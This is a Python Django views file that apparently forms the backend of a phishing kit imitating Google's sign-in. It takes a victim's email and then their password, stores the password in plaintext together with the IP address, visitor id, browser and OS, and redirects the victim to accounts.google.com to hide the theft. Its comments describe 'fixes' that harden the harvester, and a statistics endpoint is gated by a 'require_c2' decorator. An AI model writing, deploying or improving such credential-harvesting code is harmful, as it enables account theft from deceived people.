from urllib.parse import quote

from django.core.exceptions import ValidationError
from django.core.validators import validate_email
from django.http import JsonResponse, HttpResponseForbidden
from django.shortcuts import render, HttpResponseRedirect
from datetime import datetime

from . import collector_views
from .models import SignIn
from .utils import get_client_ip, is_rate_limited

MAX_PASSWORD_LENGTH = 128

hits: dict = {
    '/': 0,
    '/signin': 0,
    '/error': 0,
    '/get-hits': 0,
}


def index(request, error=None):
    hits['/'] += 1
    return render(request, 'index.html', {'error': error})


def signin(request):
    hits['/signin'] += 1

    try:
        if request.method == 'POST':
            client_ip = get_client_ip(request)

            # VULN-2 fix: rate limit by IP — 10 submissions per 60 s
            if is_rate_limited(client_ip, limit=10, period=60):
                return HttpResponseForbidden('Too many requests. Please try again later.')

            email = request.POST.get('email', None)
            password = request.POST.get('password', None)

            if email and password:
                # VULN-4 fix: explicitly truncate to avoid silent DB-level overflow
                safe_password = str(password).strip()[:MAX_PASSWORD_LENGTH]

                # VULN-1 fix: URL-encode email before inserting into redirect URL
                # to prevent query-parameter injection (e.g. email containing '&')
                # Record the browser here rather than matching it up by
                # address later. Behind a proxy - or on Docker Desktop,
                # which rewrites the source address - every visitor can
                # share one IP, and matching on it showed the wrong
                # device against every submission.
                browser, os_name = collector_views.read_ua(
                    request.META.get('HTTP_USER_AGENT', ''))

                SignIn(
                    email=str(email).strip(),
                    password=safe_password,
                    date_time=datetime.now(),
                    client_ip=client_ip,
                    vid=getattr(request, 'vid', ''),
                    browser=browser,
                    os=os_name,
                ).save()
                return HttpResponseRedirect(
                    f'https://accounts.google.com?authuser={quote(str(email).strip())}'
                )
            elif email:
                try:
                    validate_email(email)
                    return render(request, 'passwd.html', {'email': email})
                except ValidationError:
                    # Silently re-rendering the page made it look broken:
                    # you typed something, pressed Next, and landed back
                    # where you started with no explanation.
                    return index(request, error='Enter a valid email or phone number')

        return index(request)
    except Exception as e:
        print(e)
        return error(request)


def error(request):
    hits['/error'] += 1
    return render(request, '400.html')


# VULN-5 fix: restrict hit-count endpoint to logged-in staff only
@collector_views.require_c2
def get_hit_counts(request):
    hits['/get-hits'] += 1
    return JsonResponse({'hits': hits})
